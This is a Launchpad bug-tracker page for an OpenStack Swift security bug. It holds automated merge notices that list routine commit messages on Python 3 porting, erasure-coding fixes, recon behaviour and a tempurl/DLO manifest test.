This patch makes sure that running the tests does not generate warnings
all over the screen.
Change-Id: I74705c6498249337bfdf955d62e0ad972035bc1f
commit 4a6e0ccc69302a5384b988149e294656323d7f20
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Jul 20 11:58:35 2015 -0700
Rename WsgiStringIO -> WsgiBytesIO.
If we're going to have a subclass of BytesIO, having "StringIO" in its
name is just asking for confusion.
Change-Id: I695ab3105b1a02eb158dcf0399ae91888bc1c0ac
commit 5ee742c17d9ea92ca7332cb67db0cce64b7a0d8f
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Fri Jul 24 21:19:47 2015 +0530
Modifying Lambda function tuple usage for python3
Current tuple unpacking is not supported in python3
Change-Id: I15a8e977684d19154cf2233caf1174f6983ac9e2
commit 6f89f71f9ba11f7b4126b80076a0f13792332e1e
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Apr 15 16:17:23 2015 +0100
Filter Etag key from ssync replication-headers
ssync rx sends a header X-Backend-Replication-Headers whose value is a
list of headers that the source object has. This list extends the list
of allowed headers on the target object server, so that the target
object metadata is faithfully reconstructed to match the source.
Unfortunately the combination of lower() and title() operations on
header keys results in the source 'ETag' value being added to the target
metadata under the key 'Etag' in addition to the 'ETag' key that the
receiving server adds (note different capitilization), both having
the same value.
The spurious 'Etag' metadata is potentially confusing for humans
inspecting the object metadata and complicates tests that wish to
assert the equality of two object metadata dicts. See for example the
test in test\_ssync\_sender.py that this patch cleans up.
Furthermore, the possibility of having both Etag and ETag keys has
required a workaround in the EC reconstructor [1].
[1] reconstructor fix change id: Ie59ad93a67a7f439c9a84cd9cff31540f97f334a
Change-Id: I0c89cf7924a4471bb6d268b5ef3884e2d2cb4286
commit e2f69138bf5fcdd84ac23be6b0bec1bb006b41f5
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 16:46:48 2015 -0700
Fix string formatting in dispersion cli command
... and add a basic test that would have prevented the regression
Change-Id: I4c5f643ee291dcc1397ca951450459d8b8ad0bbd
commit 83025ff38dfea3d4e3f27dc045128a7aa4ba11e4
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Jul 24 11:09:10 2015 -0700
Use right most occurrence object dir in diskfile.extract\_policy
I like using the rightmost one more; it's basically
/operator-defined/mountpoint/objects/part/suffix/hash/ts.data, so I
don't see any opportunity for other things named "objects" to creep in on the
right of the real objects-N dir; but I could see some admin using
/srv/object-storage/ or something
-- Torgomatic The Wise
Change-Id: I0a63a3e02df091a5ee2e110a345183012e357a2f
commit 363a256e58ee0f3e9f059352c2de968e3dc398e3
Author: Falk Reimann <falk.reimann@sap.com>
Date: Wed Jun 24 16:54:02 2015 +0200
Support keystone v3 domains in swift-dispersion
This provides the capability to specify a project\_name,
project\_domain\_name and user\_domain\_name in /etc/swift/dispersion.conf.
If this values are set in dispersion.conf they get populated to the
swift-client. With this it is possible to have a specific dispersion
project specified, which is not the keystone default domain. Changes
were applied to swift-dispersion-populate and swift-dispersion-report.
Relevant man pages, the example dispersion.conf and the admin guide were
updated accordingly.
DocImpact
Closes-Bug: #1468374
Change-Id: I0e716f8d281b4d0f510bc568bcee4a13fc480ff7
commit 3d9b2d077a157279fb6cd107a0c83727106af3ef
Author: Daisuke Morita <morita.daisuke@lab.ntt.co.jp>
Date: Fri Jul 24 10:42:10 2015 +0900
Fix swift-object-info to show policy index at deep working directory
If swift-object-info command is executed at deeper working directory
than 'objects-\*' directory, it cannot parse policy index from file path
so it does not show appropriate policy index. This patch fixes this
problem by simply extracting the full path of a target object file.
Change-Id: Idb734106a44b6121119c9b1dc8cdaaf4c6c28c31
Closes-Bug: 1469951
commit e24d7c36fa9758618ef88ed1a8e19f4d7bb0404f
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon May 25 18:26:38 2015 +0200
Use six to fix imports on Python 3
Get configparser, queue, http\_client modules from six.moves.
Patch generated by the six\_moves operation of the sixer tool:
https://pypi.python.org/pypi/sixer
Change-Id: I666241ab50101b8cc6f992dd80134ce27327bd7d
commit 964869accce8836bd2587c4b07559fb05fe580b2
Author: Atsushi SAKAI <sakaia@jp.fujitsu.com>
Date: Fri Jul 24 17:09:48 2015 +0900
Fix six typos on swift documentation
mechanisim => mechanism
http://docs.openstack.org/developer/swift/cors.html
overridde => override
http://docs.openstack.org/developer/swift/deployment\_guide.html
extentsions => extensions
http://docs.openstack.org/developer/swift/development\_ondisk\_backends.html
reuqest => request
http://docs.openstack.org/developer/swift/logs.html
suport => support
http://docs.openstack.org/developer/swift/overview\_architecture.html
mininum => minimum
http://docs.openstack.org/developer/swift/overview\_erasure\_code.html
$ git diff | diffstat
cors.rst | 2 +-
deployment\_guide.rst | 2 +-
development\_ondisk\_backends.rst | 2 +-
logs.rst | 2 +-
overview\_architecture.rst | 2 +-
overview\_erasure\_code.rst | 2 +-
6 files changed, 6 insertions(+), 6 deletions(-)
Change-Id: I8e095f4c216b2cfae48dff1e17d387048349f73c
Closes-Bug: #1477877
commit dd2f1be3b124d3901ebbc176a7adc462b6449667
Author: Ondrej Novy <ondrej.novy@firma.seznam.cz>
Date: Tue Jun 16 17:42:58 2015 +0200
Time synchronization check in recon.
This change add call time to recon middleware and param --time to
recon CLI. This is usefull for checking if time in cluster is
synchronized.
Change-Id: I62373e681f64d0bd71f4aeb287953dd3b2ea5662
commit 89f705e8aab144092d40a13fc4ef19ffef5f3eba
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Thu Jul 23 06:11:27 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I94cf347564cb33977f33b1e64259bcb39a8cf809
commit cbcfb74132aba4d5834dc9cf33dc4f664b82d39a
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Wed Jul 22 19:32:46 2015 -0700
Cleanup nits from container\_update\_timeout
Change-Id: Ib17fc9a027db267350abc5a7db4e3172dfff7913
commit f563a423bf2534268c2e785094d58dbbe0ebd390
Author: Hamdi Roumani <roumani@ca.ibm.com>
Date: Wed Jul 22 15:27:26 2015 -0400
Updated tox setup instructions on Development Guidelines
The instructions suggest updating the ownership of the swift.egg-info
directory may be required and provide a cmd to do so. Said cmd assumes user
'swift' exists, but tox will require the current user to have access to the
directory to perform updates, moreover user swift may not exist at all.
Change-Id: I63951970553c086ff4f1ac65a81559ba69166494
commit a65e9db8752793ec37b594dc9eca5066171825db
Author: Christian Schwede <cschwede@redhat.com>
Date: Wed Jul 22 10:43:17 2015 +0000
Removing commented out code in test/unit/account/test\_backend.py
Noticed this while reviewing another change. Looks like the test itself already
ensures correct functionality of the reclaim() method in AccountBroker without
the commented code, thus removing this stale code.
Change-Id: I6a26a7591adef9fd794ca68a4e9c493d1127f93c
commit 99d052772a9585e0befdfd292fd03aefde77180a
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Mon Jul 13 01:12:43 2015 -0700
Fix 499 client disconnected on COPY EC object
Currently, a COPY request for an EC object might go to fail as 499 Client
disconnected because of the difference between destination request content
length and actual transferred bytes.
That is because the conditional response status and content length for
an EC object range GET is handled at calling the response instance on
proxy server. Therefore the calling response instance (resp()) will change
the conditional status from 200 (HTTP\_OK) to 206 (PartialContent) and will
change the content length for the range GET.
In EC case, sometimes Swift needs whole stored contents to decode a segment.
It will make 200 HTTP OK response from object-server and proxy-server
will unfortunately set whole content length to the destination content
length and it makes the bug 1467677.
This patch introduces a new method "fix\_conditional\_response" for
swift.common.swob.Response that calling \_response\_iter() and cached the
iter in the Response instance. By calling it, Swift can set correct condtional
response any time after setting whole content\_length to the response
instance like EC case.
Change-Id: If85826243f955d2f03c6ad395215c73daab509b1
Closes-Bug: #1467677
commit 2289137164231d7872731c2cf3d81b86f34f01a4
Author: John Dickinson <me@not.mn>
Date: Sat May 23 15:40:03 2015 -0700
do container listing updates in another (green)thread
The actual server-side changes are simple. The tests are a different
matter. Many changes were needed to the object server tests to
handle the now-async calls to the container server. In an effort to
test this properly, some drive-by changes were made to improve tests.
I tested this patch by doing zero-byte object writes to one container
as fast as possible. Then I did it again while also saturating 2 of the
container replica's disks. The results are linked below.
https://gist.github.com/notmyname/2bb85acfd8fbc7fc312a
DocImpact
Change-Id: I737bd0af3f124a4ce3e0862a155e97c1f0ac3e52
commit 62ed4f81ef80440550633eaaaa962a4f9383c2d3
Author: Timur Alperovich <timur.alperovich@gmail.com>
Date: Tue Jul 14 16:56:44 2015 -0700
Add two functional tests for delimiter.
The first test verifies that a delimiter will trim entries beyond the
first matching instance of delimiter (after the given matching prefix,
if any) and squash duplicates. So, when setting the delimiter
to "-", given blobs "test", "test-foo" and "test-bar-baz", we expect
only "test" (no matching delim) and "test-" (trim all characters after
the first "-", and squash duplicates).
The second test verifies that when a prefix is provided, the delimiter
will trim entries beyond the first matching instance of the delimiter
\*after the given prefix\*. So "bar, "bazar" which both match the
prefix "ba" will be returned as "bar" (no delimiter after the matching
prefix) and "baza" (after matching the prefix the remainder after the
the \*next\* matching delimiter "a" is trimmed).
Change-Id: I49a2aa8722f83e87b7d211e5c26827e93963d92a
commit 2d6c5fe2afde382edb8f04c91fca1911601b61d9
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Jul 21 09:56:13 2015 -0700
Fix Associated Projects link on Getting Started
Change-Id: I50be656bc5868242489f97c96a1feaef171933e0
commit cd7b2db550e41412281da0256b468c90ebcf3e8b
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 21 19:23:00 2015 +0530
unit tests: Replace "self.assert\_" by "self.assertTrue"
The assert\_() method is deprecated and can be safely replaced by assertTrue().
This patch makes sure that running the tests does not create undesired
warnings.
Change-Id: I0602ba39ef93263386644ee68088d5f65fcb4a71
commit c3cc98b2c918476f1b54924e0c54e4c746eba4ac
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Jul 20 17:03:20 2015 -0700
Add comment about ResumingGetter.used\_source\_etag
This confused a couple developers and took about ten minutes to
unravel in IRC; let's leave a clue for the next person.
Change-Id: I356c8c7a44de23f02eaf68d23a39c9eb4c203ff1
commit 06326d74657a8796439988115002298e4a5f4630
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Mon Jul 20 21:41:58 2015 +0530
Metaclass Python 3.x Compatibility
use "six.add\_metaclass" instead of "\_\_metaclass\_\_"
Change-Id: I57390fec40afe3a965be3215db8f79b9cf862a70
commit 317fa1af49d72ecaf7a9a499d8cdf00a086b4c6f
Author: Azhagu Selvan SP <tamizhgeek@gmail.com>
Date: Sat Jul 18 14:37:16 2015 +0530
Minor change in development saio setup doc
Make the test-requirements install command uniform with the rest of the
setup commands in the page by using the $HOME, instead of hardcoding
the folder path.
Change-Id: I8da7a191a301601e27f894f8268238d77b150ede
commit 39621b8629c7f378fc197f6ab1ddc8e2e797d1fa
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sat Jul 18 14:12:58 2015 +0530
Deprecated xreadlines() usage fixed
Change-Id: Iadf42c2f86f78c11259e21c88b4aef51db3441ad
commit dde34c4b442a27761f2e6eca46ed9ec47a110392
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sat Jul 11 22:46:41 2015 +0530
Modify zip usage for python3 where necessary.
py2 zip() is eager but py3 zip() and six.moves.zip() are lazy,
changing ones that require eager evaluation.
Change-Id: Ic9f6bccd7f57772158581905794f8d23b05f4223
commit faff98efd47fd59e28b1adb3e7ad4bc3dc6dd781
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Jul 9 07:35:47 2015 +0530
Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I9d9ca5766a2773a7b4071e280f00361d16b85383
commit 8753e452b04b0af6d6b444184b628724e14fbbb1
Author: Victor Stinner <vstinner@redhat.com>
Date: Wed May 27 18:01:37 2015 +0200
Replace StringIO with BytesIO for WSGI input
wsgi.input is a binary stream (bytes), not a text stream (unicode).
\* Replace StringIO with BytesIO for WSGI input
\* Replace StringIO('') with StringIO() and replace WsgiStringIO('') with
WsgiStringIO(): an empty string is already the default value
Change-Id: I09c9527be2265a6847189aeeb74a17261ddc781a
commit 6e70f3fa322da70c2a65fb919d200e52fc5add8a
Author: Victor Stinner <vstinner@redhat.com>
Date: Wed May 27 17:27:47 2015 +0200
Get StringIO and cStringIO from six.moves
\* replace "from cStringIO import StringIO"
with "from six.moves import cStringIO as StringIO"
\* replace "from StringIO import StringIO"
with "from six import StringIO"
\* replace "import cStringIO" and "cStringIO.StringIO()"
with "from six import moves" and "moves.cStringIO()"
\* replace "import StringIO" and "StringIO.StringIO()"
with "import six" and "six.StringIO()"
This patch was generated by the stringio operation of the sixer tool:
https://pypi.python.org/pypi/sixer
Change-Id: Iacba77fec3045f96773d1090c0bd48613729a561
commit c366ecf5c85c2797582bf79f7faab1d75b99a70e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Mon Jul 13 00:07:13 2015 +0530
Fix a minor python issue related with string.split
Replacing string.split(value, ',') with value.split(','):
the string.split() function was removed in Python 3
Change-Id: I9ed241a894ac698da33df75a774a56ae2824fadf
commit c8131c6abb17b00b043a9b95e65be819e1fd3c9d
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sun Jul 12 14:48:35 2015 +0530
sys.exc\_type/exc\_value/exc\_traceback are Deprecated
sys.exc\_info() contains a tuple of these three.
Change-Id: I530cbeb37c43da98b4924db41f6604871077bd47
commit 39b6ef6e4fd515d81e688ef365d26d5e0499be7c
Author: Charles Hsu <charles0126@gmail.com>
Date: Thu Jun 25 02:06:54 2015 +0800
Fix reconstructor stats mssage.
Calculate reconstruction job count and remaining time that
would be inappropriate for user. Use real partition count would
be suitable for user.
Change-Id: I6b025854baf4757dddf9d7fe7bc2cece58a49157
Closes-Bug: #1468298
commit bfbda38db999ccd881509c68f0319c3d3dae4274
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Jul 7 15:13:20 2015 -0700
Add save command to ring-builder-analyzer
\* cleanup command => ring builder function mapping
\* cleanup ParseCommandError/ValueError message building
Change-Id: I4be2aa963ce4f43035f02371d8388abd7a76536c
commit c907107fe4eacb378a92799de915234bd72d5d7c
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 7 22:46:37 2015 +0530
cPickle is deprecated in py3, replacing it from six.moves
cPickle is deprecated and should be replaced with six.moves
to provide py2 and py3 compatibility.
Change-Id: Ibad990708722360d188c641e61444d50a16a1e93
commit 86033ba4dcd7b86670306b6e66345ae464caca9d
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Jun 30 18:56:23 2015 +0100
EC tests should use ECDiskFileManager
Some EC tests in proxy/test\_server.py use the replication
DiskFileManager to open diskfiles. That works because it
turns out that DiskFileManager is robust to the frag index
being stitched onto the end of the timestamp in filenames,
but it would be better to test using the ECDiskFileManager
for EC diskfiles.
Also, drive-by deletion of some duplicated lines.
Change-Id: Ie3adb607d8c34a469df7d0f6f542ed5ba9a2dac0
commit 7bdb8266d4b926526acdea22e8c9c634855eeecc
Author: Thiago da Silva <thiago@redhat.com>
Date: Wed Mar 25 13:19:36 2015 +0000
Select policy when running functional test
Add ability to select a storage policy when running
the functional tests by defining the environment variable
SWIFT\_TEST\_POLICY.
This patch was first introduced by Janie Richling in
feature/ec: https://review.openstack.org/#/c/166097
Co-Authored-By: Janie Richling <jrichli@us.ibm.com>
Co-Authored-By: Christian Schwede <christian.schwede@enovance.com>
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Change-Id: Id96354546088df137def0ae7fd434baf64ed0c51
Signed-off-by: Thiago da Silva <thiago@redhat.com>

| **tags**: | added: in-feature-hummingbird |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-21:  [**Related fix proposed to swift (feature/crypto)**](/swift/%2Bbug/1453948/comments/37) |  |  | [#37](/swift/%2Bbug/1453948/comments/37) |
| --- | --- | --- | --- |

Related fix proposed to branch: feature/crypto

Review: <https://review.openstack.org/225540>

Related fix proposed to branch: feature/crypto
Review: https://review.openstack.org/225540

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-21:  [**Change abandoned on swift (feature/crypto)**](/swift/%2Bbug/1453948/comments/38) |  |  | [#38](/swift/%2Bbug/1453948/comments/38) |
| --- | --- | --- | --- |

Change abandoned by John Dickinson (<email address hidden>) on branch: feature/crypto

Review: <https://review.openstack.org/225540>

Reason: jrichli will do this

Change abandoned by John Dickinson (me@not.mn) on branch: feature/crypto
Review: https://review.openstack.org/225540
Reason: jrichli will do this

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-21:  [**Related fix merged to swift (feature/crypto)**](/swift/%2Bbug/1453948/comments/39) |  |  | [#39](/swift/%2Bbug/1453948/comments/39) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1453948/comments/39/%2Bdownload) (12.2 KiB)

Reviewed: <https://review.openstack.org/225540>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=1936299943116abcedd8b36fb8b64c724e539ab7>

Submitter: Jenkins

Branch: feature/crypto

commit 9e95613d717489da584531e220db20d1b8f43c51

Author: Alistair Coles <email address hidden>

Date: Mon Sep 21 10:01:54 2015 +0100

Fix .coveragrc to prevent nose tests error

Since v4.0 the coverage package raises an error if unrecognized

    options are found in .coveragrc [1]. Previously they were ignored. The

    ignore-errors option therefore causes nosetests with coverage to error

    because the option should be ignore\_errors (underscore not hyphen).

[1] <https://bitbucket.org/ned/coveragepy/src/tip/CHANGES.rst>

Change-Id: Ic488801b7cc43217f9e2a4ed945e06505b667608

commit 1fe8e4327b15f8933efef185d09b6067d1f28716

Author: Clay Gerrard <email address hidden>

Date: Fri Sep 18 13:54:52 2015 -0700

Fix recon tests on SAIO with multiple policies

Recon middleware used to only look on rings that exist on disk when it was

    started, so if a test didn't create a ring in the temp swift\_dir it can expect

    the middleware to not report it.

However, after we started looking at policies to determine rings [1] - we need

    to be more careful to patch policies to match up with the test requirements.

    On development environments with only the legacy default polices the existing

    recon tests were passing by accident - but not in my environment.

This change will patch policies for the TestCase so that tests will pass for

    me. Individual test methods that have more specific policy requirements for

    the test can continue to @patch\_policies just for those tests but in general

    the existing test\_methods all seem to expect legacy policies - so we just make

    the default for the TestCase legacy\_only.

Change-Id: I778a0a59091ca8870e1cab985f3ec426eb045ab7

commit a63f70c17d392379ec75045a94c38a96878b4c5c

Author: Minwoo Bae <email address hidden>

Date: Wed Sep 9 15:33:45 2015 -0500

Reconstructor logging to omit 404 warnings

Currently, the replicator does not log warning messages

    for 404 responses. We would like the reconstructor to

    do the same, as 404s are not considered unusual, and

    are already handled by the object server.

Change-Id: Ia927bf30362548832e9f451923ff94053e11b758

    Closes-Bug: #1491883

commit 530102ae07ea27b4a994e4b1fb2f590700cfef0c

Author: Bill Huber <email address hidden>

Date: Mon Sep 14 16:01:39 2015 -0500

Update EC Support on how to build an EC ring with replicas count

This doc is being updated to specify the replicas count parameter

    to build an EC ring that enforces both data and parity placements

    for each partition.

Change-Id: I770ad268e4017e610be3357e89b89f0b7d3c18af

    Closes-Bug: 1487203

commit 0d9142abd45f189b15eaec1a25464ed7d1859f97

Author: Clay Gerrard <email address hidden>

Date: Mon Sep 14 17:17:29 2015 -0700

Fix typo in Deployment Guide and add some formatting

Change-Id: I58703162bf3e9f39656a5e511bd8fe845793bca2

commit 460a7e4b64d134d1fd47f09924d594196b6...

Reviewed: https://review.openstack.org/225540
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=1936299943116abcedd8b36fb8b64c724e539ab7
Submitter: Jenkins
Branch: feature/crypto
commit 9e95613d717489da584531e220db20d1b8f43c51
Author: Alistair Coles <alistair.coles@hp.com>
Date: Mon Sep 21 10:01:54 2015 +0100
Fix .coveragrc to prevent nose tests error
Since v4.0 the coverage package raises an error if unrecognized
options are found in .coveragrc [1]. Previously they were ignored. The
ignore-errors option therefore causes nosetests with coverage to error
because the option should be ignore\_errors (underscore not hyphen).
[1] https://bitbucket.org/ned/coveragepy/src/tip/CHANGES.rst
Change-Id: Ic488801b7cc43217f9e2a4ed945e06505b667608
commit 1fe8e4327b15f8933efef185d09b6067d1f28716
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Sep 18 13:54:52 2015 -0700
Fix recon tests on SAIO with multiple policies
Recon middleware used to only look on rings that exist on disk when it was
started, so if a test didn't create a ring in the temp swift\_dir it can expect
the middleware to not report it.
However, after we started looking at policies to determine rings [1] - we need
to be more careful to patch policies to match up with the test requirements.
On development environments with only the legacy default polices the existing
recon tests were passing by accident - but not in my environment.
This change will patch policies for the TestCase so that tests will pass for
me. Individual test methods that have more specific policy requirements for
the test can continue to @patch\_policies just for those tests but in general
the existing test\_methods all seem to expect legacy policies - so we just make
the default for the TestCase legacy\_only.
Change-Id: I778a0a59091ca8870e1cab985f3ec426eb045ab7
commit a63f70c17d392379ec75045a94c38a96878b4c5c
Author: Minwoo Bae <minwoob@us.ibm.com>
Date: Wed Sep 9 15:33:45 2015 -0500
Reconstructor logging to omit 404 warnings
Currently, the replicator does not log warning messages
for 404 responses. We would like the reconstructor to
do the same, as 404s are not considered unusual, and
are already handled by the object server.
Change-Id: Ia927bf30362548832e9f451923ff94053e11b758
Closes-Bug: #1491883
commit 530102ae07ea27b4a994e4b1fb2f590700cfef0c
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Mon Sep 14 16:01:39 2015 -0500
Update EC Support on how to build an EC ring with replicas count
This doc is being updated to specify the replicas count parameter
to build an EC ring that enforces both data and parity placements
for each partition.
Change-Id: I770ad268e4017e610be3357e89b89f0b7d3c18af
Closes-Bug: 1487203
commit 0d9142abd45f189b15eaec1a25464ed7d1859f97
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Mon Sep 14 17:17:29 2015 -0700
Fix typo in Deployment Guide and add some formatting
Change-Id: I58703162bf3e9f39656a5e511bd8fe845793bca2
commit 460a7e4b64d134d1fd47f09924d594196b6458d4
Author: Brian Cline <bcline@softlayer.com>
Date: Wed Sep 2 04:13:29 2015 -0500
Fixes recon bug with initially missing rings
Previously the recon middleware was doing a basic scan for object
rings that exist at init time. In situations where an object-server
was started without an object ring present, but received one shortly
after, recon still would not report it in the /recon/ringmd5 response.
This persists even when object-server gleefully chugs along after
picking up the ring, and recon's behavior would only be corrected by
an object-server reload/restart.
This change brings the middleware a bit more up to date to use the
common POLICIES instance to determine what policies were already loaded
based on configuration, and derives the path for each ring.
This effectively makes the config the source of truth for what rings
\*should\* be present, rather than what's present at startup. Since we
already dynamically check in ReconMiddleware.get\_ring\_md5 whether each
of the predetermined ring files exist, recon now correctly reports a
previously-missing ring whenever it falls into place.
Change-Id: Ia079418e54ffac5e01ef6a15511f5069b7fe83ea
commit 9324ce83c6dcbf5fb4ffefdc781eec5db1b946c9
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Tue Sep 8 16:11:33 2015 -0500
Reconstructor GET excludes user\_agent in log
To make it easier for users to deduce in the log to find out
where the request originates from, it is necessary to include
the user\_agent field in the reconstructor for a GET method
and to have this particular log consistent with other servers'
methods.
Change-Id: I0ca7443436e97c2db64c966ab4d73c5c12a1f059
Closes-Bug: 1491871
Co-Authored-By: Kota Tsuyuzakai <tsuyuzaki.kota@lab.ntt.co.jp>
commit 369447ec47dc8df3e38046a305cf1aa0a6499ce9
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Aug 27 15:09:29 2015 -0700
Fix purge for tombstone only REVERT job
When we revert a partition we normally push it off to the specific
primary node for the index of the data files in the partition. However,
when a partition is devoid of any data files (only tombstones) we build
a REVERT job with a frag\_index of None.
This change updates the ECDiskFile's purge method to be robust to
purging tombstones when the frag\_index is None.
Add probetest to validate tombstone only revert jobs will clean
themselves up if they can validate they're in-sync with part-replica
count nodes - even if one of the primaries is down (in which case they
sync tombstones with other handoffs to fill in for the primaries)
Change-Id: Ib9a42f412fb90d51959efce886c0f8952aba8d85
commit a3facce53cac0497edb326a93a97f24e02c603ab
Author: paul luse <paul.e.luse@intel.com>
Date: Thu Aug 27 11:02:27 2015 -0700
Fix invalid frag\_index header in ssync\_sender when reverting EC tombstones
Back in d124ce [1] we failed to recognize the situation where a revert
job would have an explicit frag\_index key wth the literal value None
which would take precedence over the dict.get's default value of ''.
Later in ssync\_receiver we'd bump into the ValueError converting 'None'
to an int (again).
In ssync\_sender we now handle literal None's correctly and should
hopefully no longer put this invalid headers on the wire - but for belts
and braces we'll also update ssync\_receiver to raise a 400 series error
and ssync\_sender to better log the error messages.
1. https://review.openstack.org/#/c/195457/
Co-Author: Clay Gerrard <clay.gerrard@gmail.com>
Co-Author: Alistair Coles <alistair.coles@hp.com>
Change-Id: Ic71ba7cc82487773214030207bb193f425319449
Closes-Bug: 1489546
commit 71f6fd025ea013bc457450a5cc4f8e92c6df92cc
Author: Romain LE DISEZ <romain.ledisez@ovh.net>
Date: Tue Jun 16 12:47:26 2015 +0200
Allows to configure the rsync modules where the replicators will send data
Currently, the rsync module where the replicators send data is static. It
forbids administrators to set rsync configuration based on their current
deployment or needs.
As an example, the rsyncd configuration example encourages to set a connections
limit for the modules account, container and object. It permits to protect
devices from excessives parallels connections, because it would impact
performances.
On a server with many devices, it is tempting to increase this number
proportionally, but nothing guarantees that the distribution of the connections
will be balanced. In the worst scenario, a single device can receive all the
connections, which is a severe impact on performances.
This commit adds a new option named 'rsync\_module' to the \*-replicator sections
of the \*-server configuration file. This configuration variable can be
extrapolated with device attributes like ip, port, device, zone, ... by using
the format {NAME}. eg:
rsync\_module = {replication\_ip}::object\_{device}
With this configuration, an administrators can solve the problem of connections
distribution by creating one module per device in rsyncd configuration.
The default values are backward compatible:
{replication\_ip}::account
{replication\_ip}::container
{replication\_ip}::object
Option vm\_test\_mode is deprecated by this commit, but backward compatibility is
maintained. The option is only effective when rsync\_module is not set. In that
case, {replication\_port} is appended to the default value of rsync\_module.
Change-Id: Iad91df50dadbe96c921181797799b4444323ce2e
commit cb683d391cb66d0f52830de16760c80fd2afedf9
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Sat Sep 5 06:17:51 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I2d92b8e34a665fb0bb4c048cfb0c59de295dfce6
commit e4542455c8a07b7981c247df8b737816062c1655
Author: Emett Speer <speer.emett@gmail.com>
Date: Wed Sep 2 17:18:03 2015 -0700
[Labs] Update links to Cloud Admin Guide
Update links to the Cloud Admin Guide after the
RST conversion of that book altered URLs.
Change-Id: I899f8938498b744e62887968a65e58c00ef27f1b
commit 58fcc07523978306cd3889ada73af5d9e664cf59
Author: Christian Schwede <cschwede@redhat.com>
Date: Wed Sep 2 10:52:34 2015 +0000
Test if container\_sweep is executed on unmounted devices
This change ensures that container\_sweep is not run if a device is not mounted
and mount\_check is set to True.
Change-Id: I823083c8431d9e61fd426508033ec9188503957b
commit 615c7a204b9386e05c5bab658bfe96766ad1e680
Author: Brian Cline <bcline@softlayer.com>
Date: Tue Sep 1 10:51:20 2015 -0500
Adds useful dispersion info from changelog
Change-Id: I1a45088fc32620b02ff9a754b02ec1eb75a59d6e
commit 3b8755098a1786c5447abf158bd686293a82977c
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sun Aug 2 21:29:13 2015 +0530
Replace a / b with a // b to use integer division where needed
Change-Id: I72c81faa62786e140b0de00e3a04934bf1b5adbd
commit 58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Aug 26 16:30:23 2015 +0100
Add test that a tempurl POST cannot set a DLO manifest header
Follow up to [1] to add tests for tempurl POSTs not being allowed
to set a DLO manifest header.
[1] I11e68830009d3f6bff44ae4011a41b67139146f6
Change-Id: I7c0ad5a936f71e56c599b8495a586913d3334422
Related-Bug: 1453948
commit 4765189ef3f67b3f709c3141f222e15c6d89a62d
Author: Carlos Cavanna <ccavanna@ca.ibm.com>
Date: Thu Jul 9 23:10:05 2015 -0400
Improving statistics sent to Graphite.
Currently, statistics are organized by command. However, it would also be
useful to display statistics organized by policy. Different policies may be
based on different storage properties (ie, faster disks).
With this change, all the statistics for object timers will be sent per policy
as well.
Policy statistics reporting will use policy index and the name in Graphite will
show as proxy-server.object.policy.<policy-index>.<verb>, etc.
Updated unit tests for per-policy stat reporting and added new unit tests for
invalid cases.
Updated documentation in the Administrator's Guide to reflect this new
aggregation.
Change-Id: Id70491e4833791a3fb8ff385953d69018514cd9c
commit 5b01c5eadc3a13607d2581a55007700fca0b00af
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Fri Aug 7 16:24:28 2015 -0500
Add unit test for container\_update for unmounted device
This unit test case gains coverage for container/update.py
where a device (i.e. sda1) is not mounted and the code
responds with a warning logger that the device is not
mounted and continues. Coverage increases 2% as a result.
Change-Id: I33d247a930b28604093df4ade1ce7dbbd24aac54

[See full activity log](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/swift/%2Bfilebug)

This report contains
**Public Security**
information

